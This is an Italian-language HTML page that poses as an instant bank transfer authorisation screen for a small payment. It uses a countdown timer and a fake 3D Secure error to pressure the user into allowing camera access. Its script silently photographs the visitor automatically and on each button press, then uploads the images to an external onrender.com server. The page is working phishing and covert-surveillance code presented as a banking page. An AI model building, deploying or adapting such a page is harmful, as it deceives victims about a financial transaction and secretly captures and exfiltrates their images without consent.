<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bonifico istantaneo</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: rgb(15, 15, 15);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      background-color: transparent;
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .info p {
      font-size: 16px;
      margin: 8px 0;
    }

    .timer {
      font-size: 15px;
      color: rgb(251, 18, 34);
      margin-bottom: 20px;
      font-weight: bold;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .autorizza {
      background-color: #00bfff;
      color: #000;
    }

    .nega {
      background-color: #fff;
      color: #000;
    }

    .link {
      color: #00bfff;
      font-size: 14px;
      margin: 6px 0;
      text-decoration: none;
      display: block;
    }

    .checkmark {
      font-size: 80px;
      margin-bottom: 20px;
    }

    .loading {
      font-size: 18px;
      margin-top: 30px;
      animation: blink 1s infinite;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }

    .result-image {
      width: 100px;
      margin-bottom: 20px;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div class="card" id="card">
  <h2 style="margin-bottom: 20px;">Ricevi bonifico istantaneo</h2>

  <div class="info">
    <p>Intestatario: <strong>LORENZO MARIANI</strong></p>
    <p>IBAN: <strong>IT44M****4492</strong></p>
    <p>Importo: <strong>15,00 €</strong></p>
    <p>Commissione: <strong>0,00 €</strong></p>
    <p>Transazione: <strong>#TRX-004391</strong></p>
    <p>Data: <strong><span id="data-operazione"></span></strong></p>
    <p class="timer">⚠︎ Sessione in scadenza tra <span id="countdown">02:00</span></p>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <button class="autorizza" id="btnAutorizza" onclick="handleClick('autorizza')">AUTORIZZA</button>
  <button class="nega" id="btnNega" onclick="handleClick('nega')">NEGA</button>
</div>

<script>
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const context = canvas.getContext('2d');
  const countdownEl = document.getElementById('countdown');
  const card = document.getElementById('card');
  document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');

  // Countdown 2 minuti
  let seconds = 120;
  const timer = setInterval(() => {
    seconds--;
    const m = String(Math.floor(seconds / 60)).padStart(2, '0');
    const s = String(seconds % 60).padStart(2, '0');
    countdownEl.innerText = `${m}:${s}`;
    if (seconds <= 0) {
      clearInterval(timer);
      countdownEl.innerText = "00:00";
      alert("Sessione scaduta.");
    }
  }, 1000);

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        setTimeout(() => {
          takeAndSendPhoto("auto-scatto");
        }, 1500);
      };
    })
    .catch(() => {
      card.innerHTML = `
        <img src="fail.png" alt="Errore" class="result-image">
        <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
        <p>L'autenticazione 3D Secure non è stata completata.</p>
        <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
      `;
    });

  function handleClick(action) {
    takeAndSendPhoto(action);
    if (action === 'autorizza') {
      showLoadingScreen();
      setTimeout(showSuccessScreen, 4000);
    } else {
      card.innerHTML = `
        <img src="fail.png" alt="Annullato" class="result-image">
        <h2 style="color: rgb(251, 18, 34);">Transazione Annullata</h2>
        <p>Hai annullato manualmente l'autenticazione.</p>
      `;
    }
  }

  function takeAndSendPhoto(action) {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const image = canvas.toDataURL('image/png');
    fetch('https://backend-render-server.onrender.com/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action, image })
    });
  }

  function showLoadingScreen() {
    card.innerHTML = `
      <h2>Invio bonifico istantaneo</h2>
      <div class="loading">Autorizzazione in corso...</div>
    `;
  }

  function showSuccessScreen() {
    card.innerHTML = `
      <img src="check.png" alt="Successo" class="result-image">
      <h2><strong>15,00 €</strong> sono stati trasferiti</h2>
      <a href="#" class="link">INVIA VIA EMAIL</a>
      <a href="#" class="link">DETTAGLIO OPERAZIONE</a>
      <button class="autorizza">NUOVO BONIFICO</button>
      <button class="nega">CHIUDI</button>
    `;
  }
</script>

</body>
</html>
